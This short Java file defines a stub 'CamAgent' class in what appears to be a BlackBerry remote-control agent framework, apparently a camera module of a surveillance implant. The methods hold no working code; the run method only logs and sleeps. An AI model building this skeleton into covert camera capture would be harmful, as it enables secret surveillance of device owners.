package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class CamAgent extends Agent {
    static Debug debug = new Debug("CamAgent", DebugLevel.VERBOSE);

    public CamAgent(int AgentStatus) {
        super(Agent.AGENT_CAM, AgentStatus, true);
    }

    protected CamAgent(int AgentStatus, byte[] confParams) {
        this(AgentStatus);
        Parse(confParams);
    }

    public void AgentRun() {
        debug.trace("run");
        this.SleepUntilStopped();

    }

    protected boolean Parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
